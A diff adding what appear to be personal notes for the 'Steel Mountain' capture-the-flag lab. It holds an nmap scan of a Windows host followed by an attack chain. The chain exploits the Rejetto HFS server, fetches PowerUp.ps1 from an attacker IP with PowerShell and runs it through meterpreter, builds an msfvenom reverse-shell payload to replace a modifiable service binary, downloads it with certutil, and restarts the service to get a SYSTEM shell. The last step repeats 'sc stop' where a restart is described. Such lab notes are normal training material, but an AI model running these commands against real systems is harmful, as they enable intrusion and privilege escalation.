@@ -1,0 +1,160 @@
+PORT      STATE SERVICE            REASON  VERSION
+80/tcp    open  http               syn-ack Microsoft IIS httpd 8.5
+|_http-title: Site doesn't have a title (text/html).
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+135/tcp   open  msrpc              syn-ack Microsoft Windows RPC
+139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds       syn-ack Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+3389/tcp  open  ssl/ms-wbt-server? syn-ack
+|_ssl-date: 2024-04-24T16:46:05+00:00; +12m06s from scanner time.
+| ssl-cert: Subject: commonName=steelmountain
+| Issuer: commonName=steelmountain
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2024-04-23T16:40:45
+| Not valid after:  2024-10-23T16:40:45
+| MD5:   d974:a666:18f5:23b3:59a5:c09f:67b8:c5fb
+| SHA-1: ff34:1e7a:049d:051f:13fe:9f3e:f986:eb2c:0afe:56c2
+| -----BEGIN CERTIFICATE-----
+| MIIC3jCCAcagAwIBAgIQJvgdP8HUM5tHa5xQIr8JfjANBgkqhkiG9w0BAQUFADAY
+| MRYwFAYDVQQDEw1zdGVlbG1vdW50YWluMB4XDTI0MDQyMzE2NDA0NVoXDTI0MTAy
+| MzE2NDA0NVowGDEWMBQGA1UEAxMNc3RlZWxtb3VudGFpbjCCASIwDQYJKoZIhvcN
+| AQEBBQADggEPADCCAQoCggEBAJ+fUDf40LuSOjIjj21NfLmOsNQ2fch5lF4lpByY
+| 2ItLdUkVzpGSMFH8ocPTQb6l5cjtkt6PXl2mpwNmzz0VpWmQlGXgorOrcW9ZI/nz
+| /0YrL/mMZ1RvX5EpzrpdnZpWySAas6s3VmTUj338hsODFerMTR3MWeG5uyRat8DA
+| XiG/ZYjua586NNC+J2yPKu2D9yE/5PQXem++Uw12aLLizYuUCR7locjSlPBf+1xj
+| o2uIBGA1MY2iUBQC1+dusSPSivMQOu7OOavYgssHYapkT4s5YBN5/Ke5T/oQo1LT
+| 2SIge+ts2hVT58Ny837p0gku1w5CYfUHb/UsYjEoBMYtndMCAwEAAaMkMCIwEwYD
+| VR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBBQUAA4IB
+| AQAsndtFRQYHF8dic/fzeiuK3I3U6yWKbh6VnWLjs4cNd5MWS7Cj9b7Ozr3kh7X+
+| PkfkHl3PMdjUYyMiHOHUKoUQwwZvwsZ1hYH3+2HrlaZXQ4CLnbuKXJJDPx8TzleD
+| pxXHhE8SElVOx845QoBztNOx3tQfgSZiOp6dqRTFi4aGQxoMbitqHivoKOr2GPXE
+| e0SlWeS+9iL9ouvtdRGtVGOgsLBh7b/NnOFNpoFIijsBff5WiIFgPJVR73PWFUpE
+| OsIC5EqJ7Dfk/YufKle5hBWh0XhtNYAeUfkvJRwH91HBxxsUn2bVPKejgtmp5M0u
+| yW7bcR2eIibmPknUOltH7XW+
+|_-----END CERTIFICATE-----
+| rdp-ntlm-info: 
+|   Target_Name: STEELMOUNTAIN
+|   NetBIOS_Domain_Name: STEELMOUNTAIN
+|   NetBIOS_Computer_Name: STEELMOUNTAIN
+|   DNS_Domain_Name: steelmountain
+|   DNS_Computer_Name: steelmountain
+|   Product_Version: 6.3.9600
+|_  System_Time: 2024-04-24T16:45:04+00:00
+5985/tcp  open  http               syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+8080/tcp  open  http               syn-ack HttpFileServer httpd 2.3
+|_http-title: HFS /
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
+47001/tcp open  http               syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49152/tcp open  msrpc              syn-ack Microsoft Windows RPC
+49153/tcp open  msrpc              syn-ack Microsoft Windows RPC
+49154/tcp open  unknown            syn-ack
+49155/tcp open  unknown            syn-ack
+49156/tcp open  unknown            syn-ack
+49173/tcp open  unknown            syn-ack
+49174/tcp open  unknown            syn-ack
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   3:0:2: 
+|_    Message signing enabled but not required
+|_clock-skew: mean: 12m05s, deviation: 0s, median: 12m04s
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 36724/tcp): CLEAN (Couldn't connect)
+|   Check 2 (port 21475/tcp): CLEAN (Couldn't connect)
+|   Check 3 (port 56101/udp): CLEAN (Timeout)
+|   Check 4 (port 32452/udp): CLEAN (Failed to receive data)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-time: 
+|   date: 2024-04-24T16:45:05
+|_  start_date: 2024-04-24T16:40:09
+| nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:91:40:a1:3d:33 (unknown)
+| Names:
+|   STEELMOUNTAIN<00>    Flags: <unique><active>
+|   WORKGROUP<00>        Flags: <group><active>
+|   STEELMOUNTAIN<20>    Flags: <unique><active>
+| Statistics:
+|   02:91:40:a1:3d:33:00:00:00:00:00:00:00:00:00:00:00
+|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
+|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 12:34
+Completed NSE at 12:34, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 12:34
+Completed NSE at 12:34, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 12:34
+Completed NSE at 12:34, 0.01s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 179.71 seconds
+
+
+
+Rejetto HTTP file server
+
+powershell -command "& {Invoke-WebRequest -Uri 'https://10.4.73.176/PowerUp.ps1' -OutFile 'C:\Users\Public\PowerUp.ps1'}"
+
+
+https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
+
+
+#upload PowerUp.ps1 in another folder(Temp) with meterpreter
+
+meterpreter> upload /opt/priv/PowerUp.ps1
+meterpreter> load powershell (activate powershell)
+
+
+meterpreter>powershell_shell 
+
+PS:>. .\PowerUp.ps1 (need to have space between dots)
+PS:>Invoke-AllChecks
+
+
+ServiceName                     : AdvancedSystemCareService9
+Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
+ModifiableFileIdentityReference : STEELMOUNTAIN\bill
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
+CanRestart                      : True
+Name                            : AdvancedSystemCareService9
+Check                           : Modifiable Service Files
+
+
+msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe (to replace in legitimate ASCService.exe)
+
+
+C:\Program Files (x86)\IObit\Advanced SystemCare>certutil -urlcache -f http://10.4.73.176:80/ASCService.exe ASCService.exe
+
+
+C:\Program Files (x86)\IObit\Advanced SystemCare>sc stop AdvancedSystemCareService9
+
+C:\Program Files (x86)\IObit\Advanced SystemCare>sc stop AdvancedSystemCareService9 (start again and connect reverse shell.)
+
+
+
+
+
+
+
